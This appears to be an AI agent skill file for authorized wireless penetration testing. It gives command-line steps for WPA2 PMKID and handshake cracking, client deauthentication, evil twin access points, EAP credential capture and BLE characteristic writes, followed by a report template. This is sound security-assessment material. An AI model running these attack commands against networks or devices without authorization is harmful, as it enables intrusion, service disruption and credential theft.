---
name: wireless-network-audit
description: Audit wireless networks (WiFi, BLE, Zigbee) for security vulnerabilities using aircrack-ng, bettercap, hcxtools, and bluetooth utilities. For authorized penetration testing and security assessments only.
---

# Wireless Network Audit

## When to Use

Use when performing authorized wireless security assessments, testing WiFi configurations, auditing BLE device security, or reviewing wireless protocol implementations.

## Tool Reference

| Tool | Package | Purpose |
|------|---------|---------|
| `airmon-ng` | aircrack-ng | Monitor mode management |
| `airodump-ng` | aircrack-ng | WiFi reconnaissance |
| `aireplay-ng` | aircrack-ng | Deauth, injection |
| `aircrack-ng` | aircrack-ng | WPA/WPA2 key recovery |
| `hcxdumptool` | hcxtools | PMKID capture |
| `hcxpcapngtool` | hcxtools | Convert captures to hashcat format |
| `hashcat` | hashcat | GPU-accelerated cracking |
| `bettercap` | bettercap | WiFi/BLE/network MitM framework |
| `wifite` | wifite2 | Automated WiFi audit |
| `kismet` | kismet | Wireless IDS/recon |
| `bluetoothctl` | bluez | BLE scanning and interaction |
| `gatttool` | bluez | BLE GATT exploration |
| `bettercap` | bettercap | BLE enumeration and MitM |
| `reaver` | reaver | WPS PIN brute force |
| `mdk4` | mdk4 | 802.11 stress testing |

## WiFi Assessment Methodology

### 1. Reconnaissance

```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Scan all channels
sudo airodump-ng wlan0mon

# Target specific network (channel lock)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Kismet passive recon (web UI on :2501)
kismet -c wlan0mon
```

### 2. WPA2 PMKID Attack (clientless)

```bash
# Capture PMKID (no deauth needed)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --filterlist_ap=targets.txt --filtermode=2

# Convert to hashcat format
hcxpcapngtool -o hash.22000 pmkid.pcapng

# Crack with hashcat (mode 22000 = WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 hash.22000 wordlist.txt -r rules/best64.rule
```

### 3. WPA2 4-Way Handshake

```bash
# Capture handshake (wait or force deauth)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Deauth client to force reconnect (authorized testing only)
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Verify handshake captured
aircrack-ng handshake-01.cap

# Crack
aircrack-ng -w wordlist.txt handshake-01.cap
```

### 4. WPA3/SAE Assessment

```bash
# Dragonblood vulnerability check
# WPA3 is resistant to offline dictionary attacks but check for:
# - Transition mode (WPA3+WPA2 downgrade)
# - Side-channel timing attacks on SAE

# Detect transition mode (vulnerable to downgrade)
sudo airodump-ng wlan0mon | grep -i "WPA3.*WPA2"
```

### 5. Evil Twin / Rogue AP

```bash
# Bettercap WiFi module
sudo bettercap -iface wlan0mon

# Inside bettercap:
# wifi.recon on
# wifi.show
# wifi.ap                     # Start rogue AP
# set wifi.ap.ssid TargetSSID
# set wifi.ap.channel 6
# set wifi.ap.encryption false
```

### 6. Enterprise WPA2-EAP

```bash
# hostapd-mana for EAP credential capture
# Create hostile AP mimicking enterprise SSID
# Captures EAP identities and challenge/response pairs

# Check for certificate validation bypass
# Common finding: clients accept any certificate
```

## BLE Assessment

### 1. Scanning

```bash
# Scan for BLE devices
sudo hcitool lescan

# Bettercap BLE recon
sudo bettercap -eval "ble.recon on"

# Detailed device info
bluetoothctl
> scan on
> info AA:BB:CC:DD:EE:FF
```

### 2. GATT Enumeration

```bash
# List services and characteristics
gatttool -b AA:BB:CC:DD:EE:FF --primary
gatttool -b AA:BB:CC:DD:EE:FF --characteristics

# Read characteristic value
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x000f

# Write to characteristic (test write permissions)
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x000f -n 0100

# Interactive mode
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary
> characteristics
> char-read-hnd 0x000f
```

### 3. BLE Sniffing

```bash
# With Ubertooth One
ubertooth-btle -f -t AA:BB:CC:DD:EE:FF -c capture.pcap

# Analyze in Wireshark
wireshark capture.pcap  # Filter: btle
```

## Code Review Patterns

### Weak WiFi Configuration
```python
# FINDING: WPA2-PSK with weak passphrase policy
wifi_config = {
    "ssid": "CorpWiFi",
    "security": "WPA2-PSK",  # Should be WPA2-Enterprise
    "passphrase": "welcome1"   # Dictionary word
}
```

### BLE No Encryption
```c
// FINDING: BLE connection without encryption
// Just Works pairing = no MitM protection
gap_set_security_mode(GAP_SEC_MODE_1, GAP_SEC_LEVEL_1);  // No security
// FIX: Use GAP_SEC_LEVEL_4 (LESC + authenticated)
```

### Hardcoded BLE Keys
```python
# FINDING: Static BLE pairing key
BLE_PASSKEY = 123456  # Default/hardcoded
# Enables trivial MitM pairing
```

## Output Format

```markdown
## Wireless Security Assessment

### Scope
- **Target SSID(s)**: [names]
- **Protocol**: WPA2-PSK / WPA2-Enterprise / WPA3 / BLE
- **Authorization**: [ref number]

### Network Configuration Findings

| # | Finding | Severity | SSID/Device |
|---|---------|----------|-------------|
| 1 | WPA2 transition mode enables downgrade | High | CorpWiFi |
| 2 | PMKID retrievable (weak PSK) | Critical | GuestWiFi |
| 3 | BLE device accepts unauthenticated writes | Medium | SmartLock-v2 |

### Recommendations
1. Migrate to WPA3-SAE only (disable transition mode)
2. Use WPA2-Enterprise with certificate pinning
3. Implement BLE LESC with numeric comparison
```

## 2600 Heritage

Wireless hacking has been a 2600 staple since wardriving culture emerged in the early 2000s. The magazine documented the evolution from WEP cracking (trivially broken) through WPA/WPA2 attacks to modern WPA3 assessment, alongside Bluetooth security research and the broader wireless attack surface.
